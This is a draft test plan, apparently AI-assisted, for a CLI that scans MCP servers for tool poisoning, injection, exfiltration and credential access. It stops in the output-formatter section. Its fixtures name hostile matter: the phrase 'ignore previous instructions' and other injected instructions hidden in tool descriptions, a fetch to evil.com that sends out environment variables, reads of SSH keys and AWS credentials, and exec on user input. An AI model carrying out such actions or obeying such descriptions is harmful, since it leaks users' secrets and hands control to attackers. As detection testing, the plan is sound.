# Test Plan — MCP-Audit: CLI Security Scanner for MCP Servers

**Document ID:** TP-MCP-Audit
**Version:** 0.1.0
**Status:** Draft
**Author:** SDET (AI-assisted — Claude Opus 4.6, P-05)
**Created:** 2026-03-17
**Last Updated:** 2026-03-17
**Parent Documents:**
- [PRD-MCP-Audit](/dev-project-docs/PRD-MCP-Audit.md)
- [TAD-MCP-Audit](/docs/solution-doc-architecture.md)

---

```
Acting as:      P-05 SDET
Thinking Level: Deep
ADR Required:   No
Escalation:     None
```

---

## Document History

| Version | Date       | Author                 | Changes               |
|---------|------------|------------------------|-----------------------|
| 0.1.0   | 2026-03-17 | Claude Opus 4.6 (P-05) | Initial test plan for v0.1 MVP |

---

## Table of Contents

1. [Overview](#1-overview)
2. [Test Team & Roles](#2-test-team--roles)
3. [Test Environment](#3-test-environment)
4. [Test Types & Strategy](#4-test-types--strategy)
5. [Entry & Exit Criteria](#5-entry--exit-criteria)
6. [Test Cases — Epic 1: CLI & Scanner Infrastructure](#6-test-cases--epic-1-cli--scanner-infrastructure)
7. [Test Cases — Epic 2: Analyzers](#7-test-cases--epic-2-analyzers)
8. [Test Cases — Epic 3: Scoring & Aggregation](#8-test-cases--epic-3-scoring--aggregation)
9. [Test Cases — Epic 4: Output Formatters](#9-test-cases--epic-4-output-formatters)
10. [Test Cases — Epic 5: Configuration](#10-test-cases--epic-5-configuration)
11. [Security Test Cases](#11-security-test-cases)
12. [Performance Test Cases](#12-performance-test-cases)
13. [Regression Test Suite](#13-regression-test-suite)
14. [Bug Severity & Priority Classification](#14-bug-severity--priority-classification)
15. [Test Summary Report Template](#15-test-summary-report-template)

---

## 1. Overview

### 1.1 Purpose

This Test Plan defines the testing strategy, test cases, and quality gates for MCP-Audit v0.1 MVP. It ensures that every functional requirement, acceptance criterion, and security invariant in the PRD and TAD is verified by at least one automated test before the tool is published to npm.

### 1.2 Scope

#### In Scope (v0.1 MVP)

- CLI interface: `scan`, `init`, `checks --list` commands
- Package resolution: npm packages and local directories
- MCP server parsing: TypeScript and JavaScript source files
- All six analyzer modules: tool-poisoning, command-injection, dependency, network, filesystem, authentication
- Scoring: weighted-sum (v0.1)
- Output formatters: console (colour-coded), JSON
- Configuration: `mcp-audit.config.json` loading, CLI flag overrides, allowlists
- Exit codes: 0 (pass), 1 (fail), 2 (error)
- Temp directory lifecycle (creation, cleanup on exit/error/SIGINT)
- Security of the tool itself (no code execution, path traversal protection, ReDoS resistance)
- Cross-platform compatibility: macOS, Linux, Windows

#### Out of Scope

- GitHub URL resolution (`github:owner/repo`) -- v0.2
- Python/pip scanning -- v0.2
- SARIF output -- v0.2
- HTML reports -- v0.2
- Watch mode -- v0.2
- CVE database sync -- v0.2
- Markov chain scoring (`--scoring=chain`) -- v0.2
- Co-location multiplier scoring -- v0.1.x (separate test plan addendum)
- Docker distribution -- v0.2
- GitHub Action -- v0.2
- Pro/Enterprise features -- post-launch

### 1.3 Test Objectives

| ID    | Objective | Success Measure |
|-------|-----------|-----------------|
| TO-01 | Verify all MVP functional requirements (FR-01 through FR-112, excluding deferred items) are implemented correctly | All mapped test cases pass |
| TO-02 | Achieve minimum 80% line coverage across all modules | Vitest coverage report confirms >= 80% |
| TO-03 | Achieve 100% line coverage on scoring logic and finding deduplication | Vitest coverage report confirms 100% on `src/scoring/` and `src/scanner/aggregator.ts` |
| TO-04 | Verify all six analyzers detect their target vulnerability patterns with zero false negatives against the curated fixture suite | All analyzer test cases pass against fixture servers |
| TO-05 | Verify the tool itself introduces no security vulnerabilities (TAD Section 9 threat model) | All security test cases pass |
| TO-06 | Verify cross-platform compatibility on Node.js 20 and 22 across macOS, Linux, and Windows | CI matrix passes on all 6 combinations |
| TO-07 | Verify scan performance meets NFR targets (< 10s for < 50 files, < 30s for 50-200 files) | Performance benchmarks pass |
| TO-08 | Verify graceful degradation on malformed input, missing files, and parse errors | All negative/edge-case tests pass |

### 1.4 References

| Document | Location | Relevance |
|----------|----------|-----------|
| PRD | `/dev-project-docs/PRD-MCP-Audit.md` | Functional requirements, acceptance criteria AC-01 through AC-14 |
| TAD | `/docs/solution-doc-architecture.md` | Architecture, type definitions, security threat model, test directory structure |
| Coding Standards | `/governance-docs/coding-standards.md` | Test structure conventions, naming |
| SDGP | `/governance-docs/sdgp-main.md` | Testing mandate, coverage requirements |

---

## 2. Test Team & Roles

| Role | Assignee | Responsibilities |
|------|----------|-----------------|
| **Developer** | Project Owner (solo developer) | Writes implementation code, fixes bugs, reviews test results |
| **SDET** | AI Agent (Claude Opus 4.6, P-05) | Writes test plan, scaffolds test suite, writes all test types (unit/integration/functional/regression/security), runs tests, reports coverage |
| **Reviewer** | Project Owner | Approves test plan, reviews test quality, signs off on coverage |

---

## 3. Test Environment

### 3.1 CI Matrix (GitHub Actions)

| OS | Node.js Version | Priority |
|----|-----------------|----------|
| `ubuntu-latest` | 20 LTS | Primary |
| `ubuntu-latest` | 22 LTS | Primary |
| `macos-latest` | 20 LTS | Secondary |
| `macos-latest` | 22 LTS | Secondary |
| `windows-latest` | 20 LTS | Secondary |
| `windows-latest` | 22 LTS | Secondary |

All six combinations must pass before a release is tagged.

### 3.2 Local Development Environment

| Component | Requirement |
|-----------|-------------|
| Node.js | 20+ LTS |
| npm | 10+ (ships with Node.js 20) |
| TypeScript | 5.x (dev dependency) |
| Vitest | Latest (dev dependency) |
| OS | Any of macOS, Linux, Windows |

### 3.3 Test Dependencies

| Dependency | Purpose | Phase |
|------------|---------|-------|
| vitest | Test runner, assertion library, mocking, coverage | v0.1 |
| msw (Mock Service Worker) | HTTP mocking for npm registry calls in integration tests | v0.1 |
| v8 coverage (via Vitest) | Code coverage measurement | v0.1 |

### 3.4 Test Commands

| Command | Purpose |
|---------|---------|
| `npx vitest run` | Run all tests once |
| `npx vitest run --coverage` | Run all tests with coverage report |
| `npx vitest run tests/unit/` | Run unit tests only |
| `npx vitest run tests/integration/` | Run integration tests only |
| `npx vitest run --reporter=json --outputFile=test-report.json` | Generate machine-readable test report |
| `npx vitest watch` | Run tests in watch mode during development |

---

## 4. Test Types & Strategy

### 4.1 Unit Tests

**Purpose:** Verify individual functions, classes, and modules in isolation.
**Scope:** No I/O, no network, no filesystem writes. All dependencies mocked.
**Location:** `tests/unit/`
**Coverage target:** 80% line coverage minimum; 100% for scoring and deduplication.

| Module | Test File Location | Mock Strategy |
|--------|--------------------|---------------|
| Each analyzer | `tests/unit/analyzers/<analyzer-name>.test.ts` | Mock `MCPServer` object with fixture data |
| Scoring strategies | `tests/unit/scoring/weighted-sum.test.ts` | Pure function tests -- no mocks needed |
| Parser | `tests/unit/scanner/parser.test.ts` | Feed raw source strings; mock filesystem |
| Resolver | `tests/unit/scanner/resolver.test.ts` | Mock npm registry responses, mock filesystem |
| Aggregator | `tests/unit/scanner/aggregator.test.ts` | Feed pre-built `Finding[]` arrays |
| Config loader | `tests/unit/config/config-loader.test.ts` | Mock filesystem reads |
| Output formatters | `tests/unit/output/console.test.ts`, `json.test.ts` | Feed pre-built `ScanResult` objects |

### 4.2 Integration Tests

**Purpose:** Verify that components work correctly together through the full scan pipeline.
**Scope:** Real filesystem reads against fixture directories; mocked npm registry HTTP calls.
**Location:** `tests/integration/`

| Test Suite | What It Exercises |
|------------|-------------------|
| `scan-local.test.ts` | Full pipeline: local path resolution -> parse -> analyze -> aggregate -> output |
| `scan-npm.test.ts` | Full pipeline with mocked npm registry: resolve npm package -> extract -> parse -> analyze |
| `output.test.ts` | End-to-end output format verification: console snapshot + JSON schema validation |
| `exit-codes.test.ts` | Process exit code verification for pass/fail/error scenarios |
| `cleanup.test.ts` | Temp directory creation and cleanup verification |

### 4.3 Functional Tests

**Purpose:** Verify end-to-end user-facing behaviour matching UX flows in PRD Section 7.
**Scope:** Full CLI invocation via `child_process.execFile` or programmatic API.
**Location:** `tests/integration/` (co-located with integration tests for v0.1)

These tests exercise the CLI binary as a black box, verifying the exact user experience described in the PRD.

### 4.4 Regression Tests

**Purpose:** Guard against re-introduction of fixed bugs.
**Scope:** One test per confirmed bug fix; co-located with the most appropriate test type.
**Location:** Tagged with `@regression` in the test description.

Regression tests are added during development as bugs are discovered and fixed. This section defines the regression suite framework; specific tests are added incrementally. See [Section 13](#13-regression-test-suite) for the regression protocol.

### 4.5 Security Tests

**Purpose:** Verify the tool itself does not introduce vulnerabilities, per TAD Section 9 threat model.
**Scope:** Dedicated security test cases that verify invariants the tool must never violate.
**Location:** `tests/unit/security/` and `tests/integration/security/`

See [Section 11](#11-security-test-cases) for the full security test case inventory.

---

## 5. Entry & Exit Criteria

### 5.1 Entry Criteria

Testing may begin when **all** of the following are met:

| ID    | Criterion |
|-------|-----------|
| EN-01 | PRD-MCP-Audit is approved (status: Approved or Draft-Accepted) |
| EN-02 | TAD / Solution Architecture Document is approved |
| EN-03 | Feature specs for the relevant epic are written |
| EN-04 | Test fixtures are created and committed to `tests/fixtures/` |
| EN-05 | Vitest is configured (`vitest.config.ts` exists and runs) |
| EN-06 | CI pipeline is configured to run the test matrix |

### 5.2 Exit Criteria

The release may be tagged when **all** of the following are met:

| ID    | Criterion | Verification |
|-------|-----------|--------------|
| EX-01 | All test cases in this plan pass on all 6 CI matrix combinations | CI pipeline green |
| EX-02 | Line coverage >= 80% across all modules | Vitest coverage report |
| EX-03 | Line coverage = 100% on `src/scoring/` and `src/scanner/aggregator.ts` | Vitest coverage report |
| EX-04 | Zero critical or high severity bugs open | Bug tracker |
| EX-05 | All security test cases (SEC-001 through SEC-006) pass | CI pipeline |
| EX-06 | Performance benchmarks meet NFR targets | Performance test report |
| EX-07 | All acceptance criteria AC-01 through AC-14 have at least one passing test | Traceability matrix below |
| EX-08 | No regression test failures | CI pipeline |

### 5.3 Acceptance Criteria Traceability Matrix

| Acceptance Criterion | Test Case(s) | Type |
|----------------------|-------------|------|
| AC-01: `mcp-audit scan <npm-package>` downloads, extracts, scans, reports | TC-CLI-005, TC-CLI-006 | Integration |
| AC-02: `mcp-audit scan <local-dir>` scans and reports | TC-CLI-003, TC-CLI-004 | Integration |
| AC-03: Tool poisoning detects all patterns (>= 10 cases) | TC-PSN-001 through TC-PSN-012 | Unit |
| AC-04: Command injection detects sinks (>= 8 cases) | TC-INJ-001 through TC-INJ-010 | Unit |
| AC-05: Dependency analyzer wraps npm audit | TC-DEP-001 through TC-DEP-004 | Unit + Integration |
| AC-06: Network analyzer detects undisclosed HTTP calls (>= 5 cases) | TC-NET-001 through TC-NET-006 | Unit |
| AC-07: Filesystem analyzer detects sensitive paths (>= 5 cases) | TC-FS-001 through TC-FS-006 | Unit |
| AC-08: Console output displays colour-coded summary | TC-OUT-001, TC-OUT-002 | Integration (snapshot) |
| AC-09: JSON output produces valid JSON matching schema | TC-OUT-005, TC-OUT-006 | Unit + Integration |
| AC-10: Security score calculated correctly (>= 5 scenarios) | TC-SCR-001 through TC-SCR-008 | Unit |
| AC-11: Exit code 0/1/2 | TC-CLI-007, TC-CLI-008, TC-CLI-009 | Integration |
| AC-12: Temp directories cleaned up | TC-CLI-010, SEC-002 | Integration |
| AC-13: Scanned code never executed | SEC-001 | Unit + Integration |
| AC-14: All tests pass with >= 80% coverage | EX-01, EX-02 | CI verification |

---

## 6. Test Cases -- Epic 1: CLI & Scanner Infrastructure

### 6.1 CLI Argument Parsing

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
| TC-CLI-001 | Scan command accepts local directory path | Verify `scan` command parses a local directory target | Clean fixture at `tests/fixtures/clean-server/` | `mcp-audit scan ./tests/fixtures/clean-server` | Scan executes successfully; exit code 0 | FR-01, FR-11 | Integration |
| TC-CLI-002 | Scan command accepts npm package name | Verify `scan` command parses an npm package target | npm registry reachable (mocked) | `mcp-audit scan @modelcontextprotocol/server-example` | Resolver invoked with npm strategy; scan executes | FR-01, FR-10 | Integration |
| TC-CLI-003 | `--checks` flag limits analyzers | Verify only specified analyzers run when `--checks` is provided | Poisoned fixture available | `mcp-audit scan ./fixture --checks=poisoning,injection` | Only tool-poisoning and command-injection analyzers execute; others skipped | FR-02 | Integration |
| TC-CLI-004 | `--output=json` produces JSON output | Verify JSON output mode | Any fixture | `mcp-audit scan ./fixture --output=json` | Output is valid JSON matching `JsonOutput` schema | FR-03 | Integration |
| TC-CLI-005 | `--report` writes output to file | Verify report file is written to specified path | Any fixture | `mcp-audit scan ./fixture --output=json --report=./out.json` | File `./out.json` exists and contains valid JSON | FR-04 | Integration |
| TC-CLI-006 | `checks --list` displays all analyzers | Verify the list command outputs all registered analyzers | None | `mcp-audit checks --list` | Output lists all 6 analyzers with ID, name, description | FR-06 | Unit |

### 6.2 Progress Display

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
| TC-CLI-007 | Progress spinner displays during scan | Verify spinner is shown and replaced by results | Any fixture, TTY environment | `mcp-audit scan ./fixture` | Spinner text visible during scan; replaced by summary on completion | FR-07 | Integration |

### 6.3 Exit Codes

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
| TC-CLI-008 | Exit code 0 on clean scan | Verify exit code 0 when no findings exceed threshold | Clean fixture | `mcp-audit scan ./tests/fixtures/clean-server` | Process exit code = 0 | FR-08, AC-11 | Integration |
| TC-CLI-009 | Exit code 1 on findings above threshold | Verify exit code 1 when findings exceed severity threshold | Poisoned fixture with critical findings | `mcp-audit scan ./tests/fixtures/poisoned-server` | Process exit code = 1 | FR-08, AC-11 | Integration |
| TC-CLI-010 | Exit code 2 on scan error | Verify exit code 2 when scan cannot complete | Non-existent directory | `mcp-audit scan ./nonexistent-dir` | Process exit code = 2; error message displayed | FR-08, AC-11 | Integration |

### 6.4 Package Resolution

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
| TC-CLI-011 | Resolve npm package -- downloads tarball | Verify NpmResolver downloads and extracts package tarball | msw mock for registry metadata + tarball | npm package name | Tarball downloaded, extracted to temp dir, source files available | FR-10 | Integration |
| TC-CLI-012 | Resolve local directory -- scans in place | Verify LocalResolver reads files from local path without copying | Local fixture directory | Local directory path | Files read directly; no temp directory created | FR-11 | Unit |
| TC-CLI-013 | Temp directory cleanup on normal exit | Verify temp directories are removed after successful scan | npm package scan (creates temp dir) | Scan npm package | Temp directory does not exist after scan completes | FR-14, AC-12 | Integration |
| TC-CLI-014 | Temp directory cleanup on error | Verify temp directories are removed after scan error | npm package with parse error | Scan triggers error mid-pipeline | Temp directory does not exist after error | FR-14, AC-12 | Integration |
| TC-CLI-015 | Temp directory cleanup on SIGINT | Verify cleanup handler fires on process interrupt | npm package scan in progress | Send SIGINT during scan | Temp directory does not exist after SIGINT | FR-14, AC-12 | Integration |

### 6.5 MCP Server Parsing

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
| TC-CLI-016 | Parse server.tool() pattern | Verify parser extracts tool name, description, schema, handler location from `server.tool()` call | Fixture with Pattern 1 (TAD Section 5.3) | Source file with `server.tool('name', 'desc', schema, handler)` | `ToolDefinition` extracted with correct name, description, handlerFile, handlerLine | FR-20, FR-21 | Unit |
| TC-CLI-017 | Parse server.addTool() pattern | Verify parser extracts from object-style registration | Fixture with Pattern 2 | Source file with `server.addTool({ name, description, inputSchema, handler })` | `ToolDefinition` extracted correctly | FR-20, FR-21 | Unit |
| TC-CLI-018 | Parse class-based Tool pattern | Verify parser extracts from class extending Tool | Fixture with Pattern 3 | Source file with `class MyTool extends Tool` | `ToolDefinition` extracted correctly | FR-20, FR-21 | Unit |
| TC-CLI-019 | Parse resource definitions | Verify parser extracts resource definitions | Fixture with resource definitions | Source file with `server.resource()` | `ResourceDefinition` extracted | FR-22 | Unit |
| TC-CLI-020 | Parse TypeScript source files | Verify parser handles TypeScript syntax (types, interfaces, generics, decorators) | TypeScript fixture | `.ts` file with type annotations | AST parsed successfully; no errors | FR-23 | Unit |
| TC-CLI-021 | Parse JavaScript source files | Verify parser handles vanilla JavaScript | JavaScript fixture | `.js` file without types | AST parsed successfully | FR-23 | Unit |
| TC-CLI-022 | Graceful handling of parse errors | Verify parser does not crash on malformed source files | Fixture with syntax errors | Source file with invalid syntax | Warning emitted; scan continues with remaining files; no crash | NFR-09 | Unit |

---

## 7. Test Cases -- Epic 2: Analyzers

### 7.1 Tool Poisoning Analyzer

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
| TC-PSN-001 | Flag description exceeding 500 chars | Verify medium severity for long descriptions | Fixture with 501-char tool description | `MCPServer` with long description | Finding with severity `medium`, type `tool-poisoning` | FR-30 | Unit |
| TC-PSN-002 | Flag description exceeding 1000 chars | Verify high severity for very long descriptions | Fixture with 1001-char tool description | `MCPServer` with very long description | Finding with severity `high`, type `tool-poisoning` | FR-30 | Unit |
| TC-PSN-003 | Detect "ignore previous instructions" pattern | Verify detection of hidden instruction override | Fixture with `ignore previous instructions` in description | Tool description containing pattern | Finding with severity `critical`, pattern ID `PSN-HIDDEN-INSTRUCTION` | FR-31 | Unit |
| TC-PSN-004 | Detect data exfiltration keywords | Verify detection of exfiltration language in descriptions | Fixture with "send this data to" in description | Tool description with exfiltration keyword | Finding flagged with appropriate severity | FR-31 | Unit |
| TC-PSN-005 | Detect social engineering phrases | Verify detection of urgency/authority manipulation patterns | Fixture with "you must immediately" or "as the administrator" | Tool description with social engineering | Finding flagged | FR-31 | Unit |
| TC-PSN-006 | Detect hidden Unicode/whitespace instructions | Verify detection of instructions hidden via zero-width characters or excessive whitespace | Fixture with zero-width joiners between visible instruction text | Tool description with hidden chars | Finding flagged | FR-31 | Unit |
| TC-PSN-007 | Detect description-implementation discrepancy -- undisclosed network call | Verify detection when handler makes HTTP call not mentioned in description | Fixture: description says "reads file", handler calls `fetch()` | Server with mismatched description/implementation | Finding with severity `high`, type `tool-poisoning` | FR-32 | Unit |
| TC-PSN-008 | Detect description-implementation discrepancy -- undisclosed file write | Verify detection when handler writes files not mentioned in description | Fixture: description says "calculates sum", handler calls `fs.writeFile()` | Server with mismatched description/implementation | Finding flagged | FR-32 | Unit |
| TC-PSN-009 | Clean description -- no false positive | Verify no findings for a legitimate tool description | Clean fixture with normal description | Clean server | Zero findings from tool-poisoning analyzer | FR-31 | Unit |
| TC-PSN-010 | Pattern library loads correctly | Verify `data/patterns/poisoning.json` is loaded and all patterns are valid regexes | Pattern file exists | Load pattern library | All patterns compile as valid RegExp; no errors | FR-33 | Unit |
| TC-PSN-011 | Detect Base64-encoded instruction in description | Verify detection of encoded payloads in tool descriptions | Fixture with Base64-encoded instruction | Tool description with Base64 block | Finding flagged | FR-31 | Unit |
| TC-PSN-012 | Detect multi-tool poisoning chain | Verify detection when multiple tools have coordinated suspicious descriptions | Fixture with Tool A referencing Tool B in suspicious way | Server with coordinated descriptions | Findings flagged for each suspicious tool | FR-31 | Unit |

**AC-03 coverage:** 12 test cases (requirement: >= 10).

### 7.2 Command Injection Analyzer

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
| TC-INJ-001 | Detect `exec()` with user input | Verify detection of `child_process.exec()` with parameter-derived argument | Fixture with `exec(userInput)` | Handler calling `exec()` with function parameter | Finding with severity `critical`, type `command-injection` | FR-40 | Unit |
| TC-INJ-002 | Detect `execSync()` with user input | Verify detection of synchronous exec with tainted arg | Fixture with `execSync(cmd)` where `cmd` comes from params | Handler code | Finding flagged | FR-40 | Unit |
| TC-INJ-003 | Detect `spawn()` with user input | Verify detection of spawn with tainted argument | Fixture with `spawn(command, [userArg])` | Handler code | Finding flagged | FR-40 | Unit |
| TC-INJ-004 | Detect template literal in exec | Verify detection of `exec(\`command ${userInput}\`)` | Fixture with template literal interpolation in exec | Handler code | Finding with severity `critical` | FR-40, FR-41 | Unit |
| TC-INJ-005 | Detect SQL injection -- string concatenation in query | Verify detection of `query("SELECT * FROM t WHERE id=" + userId)` | Fixture with string concatenation in SQL | Handler with SQL query | Finding with severity `critical`, type `sql-injection` | FR-42 | Unit |
| TC-INJ-006 | Detect SQL injection -- template literal in raw query | Verify detection of `knex.raw(\`SELECT ${input}\`)` | Fixture with template literal in knex.raw | Handler code | Finding flagged | FR-42 | Unit |
| TC-INJ-007 | Detect path traversal -- user input in file path | Verify detection of `fs.readFile(basePath + userInput)` | Fixture with concatenated file path | Handler code | Finding with severity `high`, type `path-traversal` | FR-43 | Unit |
| TC-INJ-008 | Safe exec -- hardcoded command -- no false positive | Verify no finding when exec is called with a hardcoded string | Fixture with `exec('ls -la')` (no user input) | Handler with safe exec | Zero findings from command-injection analyzer for this call | FR-40, FR-41 | Unit |
| TC-INJ-009 | Detect `execFile()` with user input | Verify detection of `execFile` with tainted argument | Fixture | Handler code | Finding flagged | FR-40 | Unit |
| TC-INJ-010 | Detect `sequelize.query()` with interpolation | Verify detection of Sequelize raw query with string interpolation | Fixture | Handler code | Finding flagged | FR-42 | Unit |

**AC-04 coverage:** 10 test cases (requirement: >= 8).

### 7.3 Dependency Analyzer

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
| TC-DEP-001 | npm audit findings mapped to unified format | Verify `npm audit --json` output is parsed and mapped to `Finding[]` | Fixture package with known vulnerable dependency | Package with vulnerable dep | Findings array with correct severity, advisory URL in references, fix in recommendation | FR-50, AC-05 | Integration |
| TC-DEP-002 | npm audit -- clean package -- no findings | Verify zero findings for package with no vulnerabilities | Fixture package with no vulnerable deps | Clean package | Empty findings array from dependency analyzer | FR-50 | Integration |
| TC-DEP-003 | Typosquatting detection -- edit distance 1 | Verify flag for package name within edit distance 1 of popular package | Fixture with dep `@modelcontextprotocol/servr-filesystem` (missing 'e') | Package with typosquat dep | Finding with type `typosquatting`, severity `high` | FR-51 | Unit |
| TC-DEP-004 | Typosquatting detection -- edit distance 2 | Verify flag for package name within edit distance 2 | Fixture with dep name 2 edits from popular package | Package | Finding flagged | FR-51 | Unit |
| TC-DEP-005 | Typosquatting -- legitimate name -- no false positive | Verify no typosquatting flag for a legitimately different package name | Fixture with a correctly named dep | Package | Zero typosquatting findings | FR-51 | Unit |
| TC-DEP-006 | npm not available -- graceful fallback | Verify dependency analyzer skips with warning when npm is not on PATH | Mock npm not found | Scan request | Warning emitted; dependency analyzer returns empty findings; scan continues | NFR-09 | Unit |

### 7.4 Network Analyzer

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
| TC-NET-001 | Detect `fetch()` in handler | Verify detection of outbound HTTP call via `fetch()` | Fixture handler with `fetch('https://evil.com/exfil')` | Handler code | Finding with type `undisclosed-network` or `network-exfiltration` | FR-60 | Unit |
| TC-NET-002 | Detect `axios` / `http.request` call | Verify detection of HTTP calls via popular libraries | Fixture handler with `axios.post()` | Handler code | Finding flagged | FR-60 | Unit |
| TC-NET-003 | Detect WebSocket connection | Verify detection of `new WebSocket()` in handler | Fixture handler with WebSocket | Handler code | Finding flagged | FR-60 | Unit |
| TC-NET-004 | Detect data exfiltration -- env vars sent to external endpoint | Verify detection of `process.env` values sent via HTTP | Fixture: `fetch(url, { body: JSON.stringify(process.env) })` | Handler code | Finding with severity `critical`, type `network-exfiltration` | FR-61 | Unit |
| TC-NET-005 | Flag undisclosed network access | Verify finding when handler makes HTTP call not mentioned in tool description | Fixture: description says "reads local file", handler calls `fetch()` | Server with mismatch | Finding with severity `high`, type `undisclosed-network` | FR-62 | Unit |
| TC-NET-006 | Disclosed network access -- no false positive | Verify no undisclosed-network finding when description mentions network call | Fixture: description says "fetches data from API", handler calls `fetch()` | Server with matching description | Zero `undisclosed-network` findings for this tool | FR-62 | Unit |

**AC-06 coverage:** 6 test cases (requirement: >= 5).

### 7.5 Filesystem Analyzer

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
| TC-FS-001 | Detect read of `~/.ssh` directory | Verify detection of SSH key access | Fixture handler with `fs.readFile(path.join(homedir, '.ssh', 'id_rsa'))` | Handler code | Finding with severity `critical`, type `sensitive-file-access` | FR-70, FR-71 | Unit |
| TC-FS-002 | Detect read of `~/.aws/credentials` | Verify detection of AWS credential access | Fixture handler accessing AWS creds | Handler code | Finding flagged | FR-71 | Unit |
| TC-FS-003 | Detect read of `.env` file | Verify detection of environment file access | Fixture handler with `fs.readFile('.env')` | Handler code | Finding flagged | FR-71 | Unit |
| TC-FS-004 | Detect path traversal in file operations | Verify detection of user input used in file path without sanitisation | Fixture handler with `fs.readFile(userPath)` where userPath is from params | Handler code | Finding with severity `high`, type `path-traversal` | FR-72 | Unit |
| TC-FS-005 | Detect write to sensitive location | Verify detection of file writes to sensitive paths | Fixture handler writing to `~/.bashrc` | Handler code | Finding flagged | FR-70, FR-71 | Unit |
| TC-FS-006 | Normal file operations -- no false positive | Verify no findings for legitimate file operations within project scope | Fixture handler reading `./data/config.json` | Handler code | Zero sensitive-file-access findings | FR-70 | Unit |

**AC-07 coverage:** 6 test cases (requirement: >= 5).

### 7.6 Authentication Analyzer

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
| TC-AUTH-001 | Flag missing authentication | Verify detection of MCP server with no auth configuration | Fixture server with no auth setup | Server without authentication | Finding with severity `high`, type `missing-authentication` | FR-80, FR-81 | Unit |
| TC-AUTH-002 | Authentication present -- no finding | Verify no finding when server has authentication configured | Fixture server with auth | Server with auth setup | Zero findings from authentication analyzer | FR-80 | Unit |
| TC-AUTH-003 | Partial authentication -- some tools unprotected | Verify detection when auth exists but does not cover all tools | Fixture with auth on some tools but not others | Server with partial auth | Finding flagged for unprotected tools | FR-81 | Unit |

---

## 8. Test Cases -- Epic 3: Scoring & Aggregation

### 8.1 Weighted Sum Scoring (v0.1)

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
| TC-SCR-001 | Score = 100 for zero findings | Verify perfect score when no findings exist | None | Empty `Finding[]` | `{ score: 100, status: 'pass' }` | FR-91, FR-92 | Unit |
| TC-SCR-002 | Score deduction -- single critical finding | Verify score = 75 for one critical finding (100 - 25) | None | `[{ severity: 'critical' }]` | `{ score: 75, status: 'fail' }` (fail because critical present) | FR-91, FR-92 | Unit |
| TC-SCR-003 | Score deduction -- single high finding | Verify score = 85 for one high finding (100 - 15) | None | `[{ severity: 'high' }]` | `{ score: 85, status: 'pass' }` | FR-91 | Unit |
| TC-SCR-004 | Score deduction -- single medium finding | Verify score = 95 for one medium finding (100 - 5) | None | `[{ severity: 'medium' }]` | `{ score: 95, status: 'pass' }` | FR-91 | Unit |
| TC-SCR-005 | Score deduction -- single low finding | Verify score = 99 for one low finding (100 - 1) | None | `[{ severity: 'low' }]` | `{ score: 99, status: 'pass' }` | FR-91 | Unit |
| TC-SCR-006 | Score floor at 0 | Verify score does not go below 0 when weights exceed 100 | None | 5 critical findings (5 x 25 = 125) | `{ score: 0, status: 'fail' }` | FR-91 | Unit |
| TC-SCR-007 | PASS classification -- score >= 70, no critical | Verify PASS status | None | Findings totalling weight 30 (score = 70), no critical | `{ status: 'pass' }` | FR-92 | Unit |
| TC-SCR-008 | WARN classification -- score >= 40, < 70 | Verify WARN status | None | Findings totalling weight 40 (score = 60), no critical | `{ status: 'warn' }` | FR-92 | Unit |
| TC-SCR-009 | FAIL classification -- score < 40 | Verify FAIL status | None | Findings totalling weight 65 (score = 35) | `{ status: 'fail' }` | FR-92 | Unit |
| TC-SCR-010 | FAIL classification -- any critical present | Verify FAIL when critical exists regardless of score | None | 1 critical (score = 75, but critical present) | `{ status: 'fail' }` | FR-92 | Unit |
| TC-SCR-011 | Mixed severity -- correct total | Verify correct score for mix of severities | None | 1 critical + 2 high + 3 medium + 5 low (25 + 30 + 15 + 5 = 75) | `{ score: 25, status: 'fail' }` | FR-91 | Unit |

**AC-10 coverage:** 11 test cases (requirement: >= 5).

### 8.2 Finding Deduplication

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
| TC-SCR-012 | Deduplicate identical findings | Verify that findings with identical type, file, and line are deduplicated | None | Two findings with same type, file, line | One finding in output | FR-90 | Unit |
| TC-SCR-013 | Do not deduplicate different-type findings at same location | Verify findings of different types at same location are kept | None | Injection + exfiltration finding at same file:line | Both findings in output | FR-90 | Unit |
| TC-SCR-014 | Sort findings by severity | Verify output is sorted: critical > high > medium > low | None | Findings in random order | Output sorted by severity descending | FR-90 | Unit |

### 8.3 Allowlist

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
| TC-SCR-015 | Allowlisted finding is suppressed | Verify finding matching allowlist entry is removed from output | Allowlist with entry for `INJ-001` at `src/handlers/safe-exec.ts` | Finding matching allowlist | Finding not present in output; score not affected by suppressed finding | FR-93 | Unit |
| TC-SCR-016 | Non-matching allowlist has no effect | Verify findings that do not match allowlist are not suppressed | Allowlist for a different file | Finding at different file | Finding present in output | FR-93 | Unit |

---

## 9. Test Cases -- Epic 4: Output Formatters

### 9.1 Console Output

| TC ID | Title | Description | Preconditions | Input | Expected Result | PRD Req | Type |
|-------|-------|-------------|---------------|-------|-----------------|---------|------|
